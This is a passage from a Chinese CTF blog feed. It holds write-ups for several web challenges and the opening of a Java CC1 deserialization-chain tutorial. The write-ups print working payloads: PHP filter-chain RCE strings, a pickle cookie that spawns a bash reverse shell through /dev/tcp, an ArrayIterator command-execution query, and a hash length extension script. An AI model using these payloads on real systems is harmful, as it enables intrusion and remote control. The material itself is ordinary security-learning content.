class="hljs-number">-8859</span><span class="hljs-number">-1.</span>ISO_6937|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.MAC.UTF16|<span class="hljs-type">convert</span>.iconv.L8.UTF16BE|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="hljs-type">convert</span>.iconv.CP1163.CSA_T500|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2.</span>MSCP949|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-decode<br></code></pre></td></tr></table></figure><h1 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h1><p>还是原生类，这里需要一个类里的一个方法，我们传什么就会return什么</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=ArrayIterator&amp;aa[]=system&amp;<span class="hljs-attribute">b</span>=ArrayIterator&amp;bb[]=cat /f*&amp;<span class="hljs-attribute">c</span>=current<br></code></pre></td></tr></table></figure><p>ArrayIterator类里的current需要一个数组，会返回数组当前的元素。</p><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>有个register.php可以注册帐号，随便注册一个，随便登录，然后拿到cookie，一眼丁真是pickle反序列化，经过测试，发现过滤了R__reduce__</p><p>就换一种方式执行命令即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>a=<span class="hljs-string">&#x27;&#x27;&#x27;(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span><br><span class="hljs-string">ios</span><br><span class="hljs-string">system</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b64encode(a.encode()))<br></code></pre></td></tr></table></figure><p>然后把payload打到cookie里，服务器开启监听反弹shell</p><h1 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h1><p>hash长度扩展攻击，去github上下载一个脚本，<a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>在当前目录把脚本放进去</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">from</span> common.md5_manual <span class="hljs-keyword">import</span> md5_manual<br><span class="hljs-keyword">from</span> loguru <span class="hljs-keyword">import</span> logger<br><span class="hljs-keyword">from</span> common.crypto_utils <span class="hljs-keyword">import</span> CryptoUtils<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HashExtAttack</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    哈希长度扩展攻击,解决 hashpump 在win下使用困难的问题</span><br><span class="hljs-string">    目前仅支持md5，如果你对认证算法有了解可以手动改写str_add中的字符串拼接方式</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.know_text = <span class="hljs-string">b&quot;&quot;</span><br>        self.know_text_padding = <span class="hljs-string">b&quot;&quot;</span><br>        self.new_text = <span class="hljs-string">b&quot;&quot;</span><br>        self.rand_str = <span class="hljs-string">b&#x27;&#x27;</span><br>        self.know_hash = <span class="hljs-string">b&quot;&quot;</span><br>        self.key_length = <span class="hljs-string">b&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_padding_msg</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;填充明文&quot;&quot;&quot;</span><br>        logger.debug(<span class="hljs-string">&quot;填充明文&quot;</span>)<br>        self.know_text_padding = md5_manual.padding_str(self.know_text)<br>        logger.debug(<span class="hljs-string">f&quot;已知明文填充：<span class="hljs-subst">&#123;self.know_text_padding&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_gen_new_plain_text</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;生成新明文&quot;&quot;&quot;</span><br>        self.new_text = self.know_text_padding + self.rand_str  <span class="hljs-comment"># b&#x27;80&#x27; + 55 * b&#x27;\x00&#x27; + struct.pack(&quot;&lt;Q&quot;, 512 + len(self.rand_str) *8)</span><br>        logger.debug(<span class="hljs-string">f&quot;new_text: <span class="hljs-subst">&#123;self.new_text&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">split_hash</span>(<span class="hljs-params">self, hash_str: <span class="hljs-built_in">bytes</span></span>):<br>        by_new = CryptoUtils.trans_str_origin2_bytes(hash_str.decode())<br>        <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, by_new)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_guess_new_hash</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;生成新hash&quot;&quot;&quot;</span><br>        <span class="hljs-comment"># 第一步先生成新的字符串</span><br>        <span class="hljs-comment"># 对已知明文进行填充</span><br>        self._padding_msg()<br>        <span class="hljs-comment"># 第二步 生成新明文</span><br>        self._gen_new_plain_text()<br>        <span class="hljs-comment"># 第三步 生成新hash(基于已知hash进行计算)</span><br>        <span class="hljs-comment"># 3.1 hash拆分成4个分组</span><br>        hash_block = self.split_hash(hash_str=self.know_hash)<br>        md5_manual.A, md5_manual.B, md5_manual.C, md5_manual.D = hash_block<br>        tmp_str = md5_manual.padding_str(self.new_text)<br>        logger.debug(<span class="hljs-string">f&quot;新明文填充tmp_str(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(tmp_str)&#125;</span>): <span class="hljs-subst">&#123;tmp_str&#125;</span>&quot;</span>)<br>        logger.debug(<span class="hljs-string">f&quot;参与手工分块计算的byte：<span class="hljs-subst">&#123;tmp_str[-<span class="hljs-number">64</span>:]&#125;</span>&quot;</span>)<br>        md5_manual.solve(tmp_str[-<span class="hljs-number">64</span>:])<br>        self.new_hash = md5_manual.hex_digest()<br><br>        <span class="hljs-keyword">return</span> self.new_text, self.new_hash<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, know_text, know_hash, rand_str, key_len</span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>        <span class="hljs-comment"># self.know_text = input(&quot;请输入已知明文：&quot;)</span><br>        self.know_text = (<span class="hljs-string">&quot;*&quot;</span> * key_len + know_text).encode()  <span class="hljs-comment"># 密钥拼接</span><br>        self.know_hash = know_hash.encode()<br>        self.rand_str = rand_str.encode()<br><br>        self._guess_new_hash()<br>        <span class="hljs-keyword">return</span> self.new_text[key_len:], self.new_hash<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">input_run</span>(<span class="hljs-params">self</span>):<br>          time1=<span class="hljs-built_in">int</span>(time.time()) + <span class="hljs-number">5</span><br>          result=self.run(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;1cbc8a45c3f0166bff9eb656bfd073c4&quot;</span>,<span class="hljs-built_in">str</span>(time1),<span class="hljs-number">43</span>)    <span class="hljs-comment">#这里面第二个参数放flag的hash</span><br>          encoded_text=urllib.parse.quote(result[<span class="hljs-number">0</span>])<br>          <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>           re1=requests.get(<span class="hljs-string">&#x27;http://localhost:32985/?value=&#x27;</span>+encoded_text[:encoded_text.index(<span class="hljs-string">&#x27;171&#x27;</span>)]+<span class="hljs-string">&#x27;&amp;md5=&#x27;</span>+result[<span class="hljs-number">1</span>])       <span class="hljs-comment">#改端口</span><br>           <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br>           <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;yes&#x27;</span> <span class="hljs-keyword">in</span> re1.text:<br>             <span class="hljs-built_in">print</span>(re1.text)<br>             <span class="hljs-keyword">break</span><br><br><br>hash_ext_attack = HashExtAttack()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    logger.remove()<br>    logger.add(sys.stderr, level=<span class="hljs-string">&quot;INFO&quot;</span>)<br>    hash_ext_attack.input_run()<br></code></pre></td></tr></table></figure><p>每七八秒跑一次脚本，多跑几次就能出。</p><p>关于flag长度，推测是uuid长度+xyctf{}的长度为36+7&#x3D;43</p><h1 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h1><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>(&lt;<span class="hljs-symbol">$</span>&lt;)<br></code></pre></td></tr></table></figure><h1 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h1><p>通用文件包含：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs coq">php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16|<span class="hljs-type">convert</span>.iconv.WINDOWS-<br><span class="hljs-number">1258.</span>UTF32LE|<span class="hljs-type">convert</span>.iconv.ISIRI3342.ISO-IR<span class="hljs-number">-157</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L6.UCS2|<span class="hljs-type">conver</span><br>t.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.iconv.IBM932.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.CP1361|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.iconv.GBK.BIG5|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.865</span>.UTF16|<span class="hljs-type">convert</span>.iconv.CP901.ISO6937|<span class="hljs-type">conver</span><br>t.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM<span class="hljs-number">-932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP861.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.L4.GB13000|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR<br>|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.8859</span>_3.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM-<br><span class="hljs-number">932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF-<br><span class="hljs-number">16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.PT.UTF32|<span class="hljs-type">convert</span>.iconv.KOI8-U.IBM-<br><span class="hljs-number">932</span>|<span class="hljs-type">convert</span>.iconv.SJIS.EUCJP-WIN|<span class="hljs-type">convert</span>.iconv.L10.UCS4|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CP367.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="hljs-type">convert</span>.iconv.UHC.CP1361|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="hljs-type">convert</span>.iconv.ISO-IR-<br><span class="hljs-number">156.</span>JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L6.UCS2|<span class="hljs-type">conver</span><br>t.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.INIS.UTF16|<span class="hljs-type">convert</span>.iconv.CSIBM1133.IBM943|<span class="hljs-type">co</span><br>nvert.iconv.IBM932.SHIFT_JISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-<br>encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.SE2.UTF<span class="hljs-number">-16</span>|<span class="hljs-type">convert</span>.iconv.CSIBM1161.IBM-<br><span class="hljs-number">932</span>|<span class="hljs-type">convert</span>.iconv.MS932.MS936|<span class="hljs-type">convert</span>.iconv.BIG5.JOHAB|<span class="hljs-type">convert</span>.base64-<br>decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.base64-<br>decode/resource=php://temp&amp;<span class="hljs-number">0</span>=/readflag<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CC1链</title>
    <link href="/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/"/>
    <url>/2024/04/02/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CC1链有两种写法，我这种写法跟ysoserial里的写法不一样，另一种写法写在另一篇文章。</p><p>cc1链要求java版本小于jdk8u71</p><p>我这里用的JDK版本是8u66</p><p>因为在高版本这条链子最后的annotationInvocationHandler类readObject之后，memberValues小版本有值，高版本是空</p><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><h4 id="工欲善其事，必先利其器"><a href="#工欲善其事，必先利其器" class="headerlink" title="工欲善其事，必先利其器"></a>工欲善其事，必先利其器</h4><p>关于apache commons collections的依赖，我推荐直接用maven装，这样方便快捷。在你的IDEA里，新建一个项目，在构建系统里选择Maven即可。</p><img src="/img/JAVA反序列化-CC1链/image-20240401194123468.png" alt="image-20240401194123468" style="zoom: 70%;" /><p>找到你项目下的pom.xml文件，这是maven获取依赖的配置文件，对于CC链的依赖，我们把以下代码写入保存即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>CC<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.22.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如果maven下载的包里是已经编译好的.class文件，那么可以在maven的设置里选择下载java和注释文件，这样才方便我们的调试。</p><p>至此，环境依赖的问题就解决了。</p><hr style="border: 1px solid black;"/><h1 id="链子构建"><a href="#链子构建" class="headerlink" title="链子构建"></a>链子构建</h1><p>入口类：Transformer类</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span>  –Commons Collections自定义的一组功能类<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类接受一个对象，并对传入的对象进行一些操作。</p><p>在这个类的引用里有一个InvokerTransformer类<img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC1%E9%93%BE/image-20240401195937440.png" alt="image-20240401195937440"></p><p><img 